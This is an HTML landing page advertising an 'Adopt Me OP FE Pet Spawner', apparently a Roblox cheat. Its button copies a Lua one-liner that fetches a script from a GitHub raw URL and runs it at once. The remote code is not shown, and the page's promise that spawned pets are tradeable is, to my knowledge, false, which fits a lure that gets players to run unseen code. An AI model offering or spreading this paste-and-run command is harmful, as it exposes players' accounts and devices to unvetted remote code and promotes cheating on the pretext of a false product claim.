<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Sandy's Scripts</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      font-family: 'Arial', sans-serif;
      color: white;
      text-align: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      background: linear-gradient(270deg, red, orange, yellow, green, cyan, blue, violet);
      background-size: 1400% 1400%;
      animation: rainbow 20s ease infinite;
    }

    @keyframes rainbow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    h1 {
      font-size: 2.5rem;
      text-shadow: 2px 2px 10px #00000080;
      margin-bottom: 10px;
    }

    p {
      font-size: 1.2rem;
      text-shadow: 1px 1px 5px #00000070;
      margin-bottom: 30px;
    }

    button {
      background: white;
      color: black;
      border: none;
      padding: 15px 30px;
      font-size: 1.2rem;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
      transition: background-color 0.3s ease;
    }

    button:hover {
      background: #f0f0f0;
    }

    #confirmation {
      margin-top: 15px;
      font-size: 1rem;
      color: #fff;
      text-shadow: 0 0 5px #000;
      opacity: 0;
      transition: opacity 0.5s ease;
      user-select: none;
    }

    #confirmation.show {
      opacity: 1;
    }
  </style>
</head>
<body>
  <h1>ðŸ¦„ Adopt Me OP FE Pet Spawner</h1>
  <p>TRADEABLE & EQUIPPABLE â€¢ 2025 Edition</p>

  <button id="copyBtn">Copy Spawn Script</button>
  <div id="confirmation">Copied to clipboard! âœ…</div>

  <script>
    const copyBtn = document.getElementById('copyBtn');
    const confirmation = document.getElementById('confirmation');
    const scriptText = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/scripts/refs/heads/main/adopt_pet_spawner.lua",true))()';

    copyBtn.addEventListener('click', () => {
      navigator.clipboard.writeText(scriptText).then(() => {
        confirmation.classList.add('show');
        setTimeout(() => {
          confirmation.classList.remove('show');
        }, 2000);
      }).catch(() => {
        alert('Failed to copy, please copy manually:\n' + scriptText);
      });
    });
  </script>
</body>
</html>
